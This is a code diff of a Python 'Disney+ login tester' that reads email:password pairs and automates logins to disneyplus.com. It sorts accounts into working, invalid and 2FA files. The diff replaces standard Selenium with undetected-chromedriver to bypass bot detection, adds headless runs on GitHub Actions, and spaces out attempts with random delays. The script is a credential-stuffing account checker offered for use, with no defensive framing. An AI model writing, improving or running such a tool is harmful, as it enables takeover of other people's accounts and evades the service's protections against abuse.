@@ -1,16 +1,16 @@
 """
-DISNEY+ LOGIN TESTER - GITHUB ACTIONS READY
-Runs in headless mode, no confirmation prompts
+DISNEY+ LOGIN TESTER - GITHUB ACTIONS OPTIMIZED
+Uses undetected-chromedriver to bypass detection
 """
 
 import time
 import random
 import os
-from selenium import webdriver
+import sys
+import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options
 
 class DisneyTester:
     def __init__(self):
@@ -23,8 +23,8 @@ class DisneyTester:
         self.invalid = []
         self.twofa_accounts = []
         
-        # Check if running on GitHub Actions
-        self.is_github_actions = os.environ.get('GITHUB_ACTIONS') == 'true'
+        # GitHub Actions detection
+        self.is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
         
     def load_accounts(self):
         """Load accounts from file"""
@@ -46,109 +46,27 @@ class DisneyTester:
         return True
     
     def create_driver(self):
-        """Create Chrome driver (headless for GitHub Actions)"""
-        options = Options()
+        """Create undetected Chrome driver"""
+        options = uc.ChromeOptions()
         
-        # Anti-detection
-        options.add_argument('--disable-blink-features=AutomationControlled')
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        options.add_argument("--window-size=1920,1080")
-        
-        # Headless mode for GitHub Actions (no visible browser)
-        if self.is_github_actions:
-            print(f"   🕶️ Running in headless mode (GitHub Actions)")
+        if self.is_github:
+            print(f"   🕶️ GitHub Actions mode - setting up headless")
             options.add_argument('--headless=new')
             options.add_argument('--no-sandbox')
             options.add_argument('--disable-dev-shm-usage')
             options.add_argument('--disable-gpu')
-            options.add_argument('--disable-software-rasterizer')
-        else:
-            options.add_argument("--start-maximized")
+            options.add_argument('--window-size=1920,1080')
+            options.add_argument('--disable-blink-features=AutomationControlled')
         
-        driver = webdriver.Chrome(options=options)
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        
+        # Create undetected driver
+        driver = uc.Chrome(options=options, headless=self.is_github, version_main=120)
         driver.set_page_load_timeout(60)
         return driver
     
-    def close_cookie_popup_with_wait(self, driver):
-        """Wait up to 30 seconds for cookie popup, then close it"""
-        print(f"   🍪 Waiting for cookie popup (max 30 seconds)...")
-        
-        # Wait for cookie popup to appear (up to 30 seconds)
-        cookie_found = False
-        for i in range(30):
-            try:
-                cookie_banner = driver.find_element(By.ID, "onetrust-banner-sdk")
-                if cookie_banner.is_displayed():
-                    cookie_found = True
-                    print(f"   🍪 Cookie popup detected after {i+1} seconds!")
-                    break
-            except:
-                pass
-            
-            try:
-                accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
-                if accept_btn.is_displayed():
-                    cookie_found = True
-                    print(f"   🍪 Cookie popup detected after {i+1} seconds!")
-                    break
-            except:
-                pass
-            
-            time.sleep(1)
-            if i % 5 == 0 and i > 0:
-                print(f"   ⏳ Waiting for cookie popup... ({i+1}/30 seconds)")
-        
-        if not cookie_found:
-            print(f"   ✅ No cookie popup appeared after 30 seconds, continuing...")
-            return True
-        
-        print(f"   🔧 Attempting to close cookie popup...")
-        
-        for attempt in range(5):
-            try:
-                accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
-                if accept_btn.is_displayed():
-                    driver.execute_script("arguments[0].click();", accept_btn)
-                    print(f"   ✅ Clicked 'Accept All' button")
-                    time.sleep(2)
-                    return True
-            except:
-                pass
-            
-            try:
-                buttons = driver.find_elements(By.TAG_NAME, "button")
-                for btn in buttons:
-                    text = btn.text.lower()
-                    if 'accept' in text or 'agree' in text:
-                        driver.execute_script("arguments[0].click();", btn)
-                        print(f"   ✅ Clicked '{btn.text}' button")
-                        time.sleep(2)
-                        return True
-            except:
-                pass
-            
-            try:
-                driver.execute_script("""
-                    var banner = document.getElementById('onetrust-banner-sdk');
-                    if(banner) banner.remove();
-                    var overlay = document.querySelector('[class*="cookie"]');
-                    if(overlay) overlay.remove();
-                """)
-                print(f"   ✅ Removed cookie banner with JavaScript")
-                time.sleep(1)
-                return True
-            except:
-                pass
-            
-            print(f"   ⚠️ Attempt {attempt+1} failed, retrying...")
-            time.sleep(2)
-        
-        print(f"   ⚠️ Could not close cookie popup, continuing anyway...")
-        return True
-    
     def test_login(self, account):
-        """Test login with proper waiting"""
+        """Test login with undetected Chrome"""
         email = account['email']
         password = account['password']
         
@@ -157,116 +75,68 @@ class DisneyTester:
         driver = None
         try:
             driver = self.create_driver()
+            wait = WebDriverWait(driver, 30)
             
+            # Go to Disney+ login
             print(f"   📄 Loading page...")
             driver.get("https://www.disneyplus.com/identity/login/enter-email")
+            time.sleep(5)
             
-            print(f"   ⏳ Waiting for page to load...")
-            for i in range(15):
-                if "login" in driver.current_url.lower():
-                    print(f"   ✅ Page loaded after {i+1} seconds")
-                    break
-                time.sleep(1)
-            
-            time.sleep(3)
-            
-            self.close_cookie_popup_with_wait(driver)
-            time.sleep(2)
-            
+            # Wait for email field
             print(f"   📧 Looking for email field...")
-            email_input = None
-            for attempt in range(15):
-                try:
-                    email_input = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
-                    if email_input.is_displayed():
-                        print(f"   ✅ Email field found after {attempt+1} seconds")
-                        break
-                except:
-                    pass
-                time.sleep(1)
+            email_input = wait.until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']"))
+            )
             
-            if not email_input:
-                print(f"   ❌ Email field not found after 15 seconds")
-                return False
-            
-            driver.execute_script("arguments[0].click();", email_input)
-            time.sleep(0.5)
+            # Type email
             email_input.clear()
-            
             for char in email:
                 email_input.send_keys(char)
                 time.sleep(0.02)
             print(f"   📧 Email entered")
-            time.sleep(1)
+            time.sleep(2)
             
-            print(f"   📤 Looking for continue button...")
-            continue_btn = None
-            for attempt in range(10):
-                try:
-                    continue_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-                    if continue_btn.is_displayed():
-                        print(f"   ✅ Continue button found after {attempt+1} seconds")
-                        break
-                except:
-                    pass
-                time.sleep(1)
-            
-            if not continue_btn:
-                print(f"   ❌ Continue button not found")
-                return False
-            
+            # Click continue
+            continue_btn = wait.until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
+            )
             driver.execute_script("arguments[0].click();", continue_btn)
             print(f"   📤 Continue clicked")
-            
-            print(f"   ⏳ Waiting for password page...")
             time.sleep(5)
             
+            # Check for 2FA
             page_text = driver.page_source.lower()
-            if 'verification' in page_text or 'code' in page_text:
-                if 'enter' in page_text:
-                    print(f"   🔐 2FA REQUIRED - Skipping account")
-                    self.twofa_accounts.append({'email': email, 'password': password})
-                    self.save_2fa()
-                    return None
+            if 'verification' in page_text or 'enter the code' in page_text:
+                print(f"   🔐 2FA REQUIRED - Skipping")
+                self.twofa_accounts.append({'email': email, 'password': password})
+                self.save_2fa()
+                return None
             
+            # Wait for password field
             print(f"   🔑 Looking for password field...")
-            password_input = None
-            for attempt in range(20):
-                try:
-                    password_input = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
-                    if password_input.is_displayed():
-                        print(f"   ✅ Password field found after {attempt+1} seconds")
-                        break
-                except:
-                    pass
-                time.sleep(1)
+            password_input = wait.until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
+            )
             
-            if not password_input:
-                print(f"   ❌ Password field not found after 20 seconds")
-                if 'verification' in driver.page_source.lower():
-                    print(f"   🔐 2FA REQUIRED - Skipping account")
-                    self.twofa_accounts.append({'email': email, 'password': password})
-                    self.save_2fa()
-                    return None
-                return False
-            
-            driver.execute_script("arguments[0].click();", password_input)
-            time.sleep(0.5)
+            # Type password
             password_input.clear()
-            
             for char in password:
                 password_input.send_keys(char)
                 time.sleep(0.02)
             print(f"   🔑 Password entered")
-            time.sleep(1)
+            time.sleep(2)
             
-            login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+            # Click login
+            login_btn = wait.until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
+            )
             driver.execute_script("arguments[0].click();", login_btn)
             print(f"   📤 Login clicked")
             
-            print(f"   ⏳ Waiting for login result...")
-            time.sleep(10)
+            # Wait for result
+            time.sleep(8)
             
+            # Check result
             current_url = driver.current_url.lower()
             
             if 'home' in current_url or 'browse' in current_url or 'subscription' in current_url:
@@ -274,19 +144,14 @@ class DisneyTester:
                 self.working.append({'email': email, 'password': password})
                 self.save_results()
                 return True
-            elif 'login' in current_url:
-                print(f"   ❌ INVALID - Wrong password")
-                self.invalid.append({'email': email, 'password': password})
-                self.save_results()
-                return False
             else:
-                print(f"   ❌ INVALID - Login failed")
+                print(f"   ❌ INVALID")
                 self.invalid.append({'email': email, 'password': password})
                 self.save_results()
                 return False
                     
         except Exception as e:
-            print(f"   ❌ Error: {str(e)[:80]}")
+            print(f"   ❌ Error: {str(e)[:100]}")
             self.invalid.append({'email': email, 'password': password})
             self.save_results()
             return False
@@ -294,41 +159,27 @@ class DisneyTester:
         finally:
             if driver:
                 driver.quit()
-                # Shorter delay for GitHub Actions (faster execution)
-                if self.is_github_actions:
-                    delay = random.uniform(20, 40)
-                else:
-                    delay = random.uniform(45, 90)
-                print(f"   ⏰ Waiting {delay:.0f} seconds before next account...")
+                delay = random.uniform(20, 40)
+                print(f"   ⏰ Waiting {delay:.0f} seconds...")
                 time.sleep(delay)
     
     def save_results(self):
         """Save working and invalid accounts"""
         if self.working:
             with open(self.working_file, 'w') as f:
-                f.write("="*50 + "\n")
-                f.write("✅ WORKING DISNEY+ ACCOUNTS ✅\n")
-                f.write("="*50 + "\n\n")
                 for acc in self.working:
                     f.write(f"{acc['email']}:{acc['password']}\n")
             print(f"\n💾 Saved {len(self.working)} working accounts")
         
         if self.invalid:
             with open(self.invalid_file, 'w') as f:
-                f.write("="*50 + "\n")
-                f.write("❌ INVALID DISNEY+ ACCOUNTS ❌\n")
-                f.write("="*50 + "\n\n")
                 for acc in self.invalid:
                     f.write(f"{acc['email']}:{acc['password']}\n")
-            print(f"💾 Saved {len(self.invalid)} invalid accounts")
     
     def save_2fa(self):
         """Save 2FA accounts"""
         if self.twofa_accounts:
             with open(self.twofa_file, 'w') as f:
-                f.write("="*50 + "\n")
-                f.write("🔐 2FA REQUIRED ACCOUNTS 🔐\n")
-                f.write("="*50 + "\n\n")
                 for acc in self.twofa_accounts:
                     f.write(f"{acc['email']}:{acc['password']}\n")
             print(f"💾 Saved {len(self.twofa_accounts)} 2FA accounts")
@@ -355,49 +206,19 @@ def main():
     
     print(f"\n📊 {len(tester.accounts)} accounts to test")
     
-    if tester.is_github_actions:
-        print(f"🕶️ Running on GitHub Actions - Headless mode")
-        print(f"⏱️ Estimated time: ~{len(tester.accounts) * 0.8:.1f} minutes")
-        print(f"\n▶️ Auto-starting in 5 seconds...")
-        time.sleep(5)
+    if tester.is_github:
+        print("🕶️ Running on GitHub Actions")
         start_time = time.time()
         tester.check_all()
         end_time = time.time()
-        
-        print(f"\n{'='*50}")
-        print("✅ TESTING COMPLETE!")
-        print(f"{'='*50}")
-        print(f"⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
+        print(f"\n✅ Complete! Time: {(end_time - start_time) / 60:.1f} minutes")
         print(f"✅ Working: {len(tester.working)}")
         print(f"❌ Invalid: {len(tester.invalid)}")
-        print(f"🔐 2FA Required: {len(tester.twofa_accounts)}")
-        print(f"\n📁 Files created:")
-        print(f"   - WORKING_ACCOUNTS.txt")
-        print(f"   - INVALID_ACCOUNTS.txt")
-        print(f"   - TWOFA_ACCOUNTS.txt")
+        print(f"🔐 2FA: {len(tester.twofa_accounts)}")
     else:
-        print(f"⏱️ Estimated time: ~{len(tester.accounts)} minutes")
-        print("\n⚠️ Each account takes 45-90 seconds (including delays)")
-        print("⚠️ Cookie popup: Script waits up to 30 seconds for it")
-        
-        confirm = input("\n▶️ Start testing? (yes/no): ")
-        
+        confirm = input("\n▶️ Start? (yes/no): ")
         if confirm.lower() == 'yes':
-            start_time = time.time()
             tester.check_all()
-            end_time = time.time()
-            
-            print(f"\n{'='*50}")
-            print("✅ TESTING COMPLETE!")
-            print(f"{'='*50}")
-            print(f"⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
-            print(f"✅ Working: {len(tester.working)}")
-            print(f"❌ Invalid: {len(tester.invalid)}")
-            print(f"🔐 2FA Required: {len(tester.twofa_accounts)}")
-            print(f"\n📁 Files created:")
-            print(f"   - WORKING_ACCOUNTS.txt")
-            print(f"   - INVALID_ACCOUNTS.txt")
-            print(f"   - TWOFA_ACCOUNTS.txt")
 
 if __name__ == "__main__":
     main()
